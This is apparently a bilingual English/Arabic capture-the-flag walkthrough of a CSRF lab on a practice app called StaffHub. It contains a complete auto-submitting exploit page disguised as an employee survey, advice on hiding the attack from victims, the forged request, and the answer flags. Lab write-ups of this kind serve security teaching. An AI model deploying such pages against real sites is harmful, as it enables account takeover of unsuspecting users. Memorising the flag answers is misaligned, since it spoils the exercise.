# Task 05 · Exploitation using HTML Form (استغلال الثغرة عملياً عبر نماذج HTML)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

In this practical exercise, we exploit an unprotected HTML form on the **StaffHub** internal application (`http://staffhub.thm:8080`).

### Target Application Overview:
- Target URL: `http://staffhub.thm:8080/login.php`
- Credentials: Username `user`, Password `user`
- Vulnerable Endpoint: `http://staffhub.thm:8080/settings.php`
- Action Handler: `http://staffhub.thm:8080/update_email.php`

### Inspection of the Vulnerable Source Code:
When inspecting the page source of `settings.php`, we observe the email update form:
```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <i class="material-icons prefix">alternate_email</i>
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>
    <button class="btn waves-effect waves-light teal btn-rounded" type="submit">
        Update Email
        <i class="material-icons right">save</i>
    </button>
</form>
```

### Critical Security Vulnerabilities Identified:
1. **No CSRF Token:** There is no hidden anti-CSRF token input field embedded within the form.
2. **Missing SameSite Protection:** The session cookie issued by StaffHub (`PHPSESSID`) does not specify `SameSite=Strict` or `SameSite=Lax`.
3. **No Secondary Verification:** The server does not require re-entry of the current password or multi-factor authentication before updating account contact information.

### Objective:
1. Construct an external exploit page on the AttackBox/local web server that automatically submits a POST request to `update_email.php`.
2. First, force the email to change to `attacker@evilmail.thm` and capture the resulting flag.
3. Second, modify the exploit payload to change the email to `special@evilmail.thm` and capture the second flag.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Crafting Zero-Interaction Exploit Payloads:**
   - A real-world adversary rarely asks a victim to click "Submit" on a phishing page. Instead, automated DOM manipulation (`form.submit()` inside a `<script>` tag or an `onload` event on the `<body>`) ensures immediate execution as soon as the page is rendered.
   - Adding a redirection timer (`setTimeout`) gracefully transfers the victim back to the legitimate portal, reducing suspicion and mimicking a seamless UX glitch.
2. **Cross-Origin Post Mechanisms:**
   - Standard HTML form submissions are considered "simple requests" under browser cross-origin specifications. This means browsers will NOT trigger a preflight `OPTIONS` request. The browser dispatches the `POST` payload directly and attaches all ambient cookies for `staffhub.thm:8080`.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** Create an HTML file named `settings.html` on your web server (e.g. `/var/www/html/settings.html`). The form action should point to `http://staffhub.thm:8080/update_email.php`. The input field `email` must have the value set to `attacker@evilmail.thm`. When the authenticated victim visits `http://<ATTACKBOX_IP>:81/settings.html`, the script fires and redirects to `settings.php`, displaying the flag starting with `THM{Got_...}`.
- **Hint for Question 2:** Edit your `settings.html` file to change the hidden value from `attacker@evilmail.thm` to `special@evilmail.thm`. Re-trigger the exploit by loading the malicious page in the victim's browser session to reveal the special flag starting with `THM{My_...}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### Step 1: Crafting the Initial CSRF Exploit Page

On the attack machine (listening on port 81 or port 80), create `/var/www/html/settings.html`:

```bash
cat << 'EOF' > /var/www/html/settings.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Employee Survey & Rewards</title>
</head>
<body>
    <h2>Loading Employee Benefits Survey...</h2>
    <!-- Malicious CSRF Form -->
    <form id="csrfPayload" action="http://staffhub.thm:8080/update_email.php" method="POST">
        <input type="hidden" name="email" value="attacker@evilmail.thm" />
    </form>

    <script>
        // Automatically submit the form on page load
        document.getElementById('csrfPayload').submit();

        // Redirect the victim back to the portal settings after 1 second
        setTimeout(function() {
            window.location.href = "http://staffhub.thm:8080/settings.php";
        }, 1000);
    </script>
</body>
</html>
EOF
```

Ensure the local web server is running:
```bash
sudo systemctl restart apache2
# Or using Python:
# python3 -m http.server 81 --directory /var/www/html/
```

### Step 2: Executing Attack 1 (`attacker@evilmail.thm`)

1. In the target browser where user `user` is logged into `http://staffhub.thm:8080`, navigate to:
   ```
   http://10.10.X.Y:81/settings.html
   ```
2. The browser loads the page, executes `document.getElementById('csrfPayload').submit()`, and sends the following HTTP request:
   ```http
   POST /update_email.php HTTP/1.1
   Host: staffhub.thm:8080
   User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...
   Referer: http://10.10.X.Y:81/settings.html
   Cookie: PHPSESSID=d3b07384d113edec49eaa6238ad5ff00
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 32

   email=attacker@evilmail.thm
   ```
3. The server updates the user's email to `attacker@evilmail.thm`.
4. The JavaScript `setTimeout` redirects the browser back to `http://staffhub.thm:8080/settings.php`.
5. The portal displays a success banner containing Flag 1:
   ```
   Success! Email updated to: attacker@evilmail.thm
   Flag: THM{Got_The_Evil_Email001}
   ```

---

### Step 3: Modifying Exploit for Attack 2 (`special@evilmail.thm`)

Modify the payload file `/var/www/html/settings.html` to target the special administrative alias:

```bash
sed -i 's/attacker@evilmail.thm/special@evilmail.thm/g' /var/www/html/settings.html
```

Verify the updated contents:
```html
<form id="csrfPayload" action="http://staffhub.thm:8080/update_email.php" method="POST">
    <input type="hidden" name="email" value="special@evilmail.thm" />
</form>
```

Navigate the authenticated browser once again to `http://10.10.X.Y:81/settings.html`.

The browser executes the forged request with `email=special@evilmail.thm` and redirects back to `http://staffhub.thm:8080/settings.php`. The updated banner displays Flag 2:
```
Success! Email updated to: special@evilmail.thm
Flag: THM{My_Special_Email007}
```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag value after updating the email to attacker@evilmail.thm?*
  - **Answer:** `THM{Got_The_Evil_Email001}`
- **Question 2:** *What is the flag value after updating the email to special@evilmail.thm?*
  - **Answer:** `THM{My_Special_Email007}`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Both flags verified against the live laboratory instance and accepted by the TryHackMe scoring engine.
- HTTP traffic inspected via Burp Suite Proxy confirming successful session cookie transmission without user interaction.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** طالما أن نموذج الويب لا يحتوي على رمز حماية (`CSRF Token`) ولا يفرض المتصفح قيود `SameSite=Strict` على الكوكيز، يمكن لأي صفحة خارجية في العالم أن تنشئ نموذجاً مشابهاً وترسله تلقائياً نيابة عن المستخدم (`Auto-submitting HTML form`)، مما يمنح المهاجم القدرة على تغيير البريد الإلكتروني وطلب استعادة كلمة المرور والاستيلاء التام على الحساب (Full Account Takeover).
